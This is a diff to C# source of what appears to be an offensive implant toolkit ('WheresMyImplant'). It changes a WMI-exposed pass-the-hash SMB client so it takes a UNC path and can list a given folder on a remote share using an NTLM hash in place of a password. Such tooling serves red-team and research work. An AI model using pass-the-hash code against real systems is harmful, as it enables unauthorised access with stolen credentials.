@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Linq;
 using System.Management.Instrumentation;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -189,16 +190,35 @@ namespace WheresMyImplant
         */
 
         [ManagementTask]
-        public static String PTHSMBClient(String target, String share, String domain, String username, String hash)
+        public static String PTHSMBClient(String uncPath, String domain, String username, String hash)
         {
             StringBuilder output = new StringBuilder();
             using (SMBClient smbClient = new SMBClient())
             {
+                String target, share, folder;
+                try
+                {
+                    var enumerator = uncPath.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries).GetEnumerator();
+                    if (!enumerator.MoveNext())
+                        return "Invalid UNC Path";
+                    target = (String)enumerator.Current;
+
+                    if (!enumerator.MoveNext())
+                        return "Invalid UNC Path";
+                    share = (String)enumerator.Current;
+
+                    folder = enumerator.MoveNext() ? (String)enumerator.Current : String.Empty;
+                }
+                catch (Exception ex)
+                {
+                    return ex.ToString();
+                }
+
                 if (!smbClient.Connect(target))
                 {
                     return "[-] Unable to Connect";
                 }
-
+                
                 smbClient.NegotiateSMB();
                 smbClient.NegotiateSMB2();
                 smbClient.NTLMSSPNegotiate();
@@ -213,9 +233,14 @@ namespace WheresMyImplant
                     smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
                     smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
                     smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));
-                    smbClient.CreateRequest();
+                    smbClient.CreateRequest(String.Empty);
                     smbClient.InfoRequest();
-                    smbClient.FindRequest();
+                    if (!String.IsNullOrEmpty(folder))
+                    {
+                        smbClient.CreateRequest(folder);
+                        smbClient.CloseRequest();
+                    }
+                    smbClient.FindRequest(folder);
                     smbClient.ParseDirectoryContents();
                     smbClient.CloseRequest();
                     smbClient.DisconnectTree();
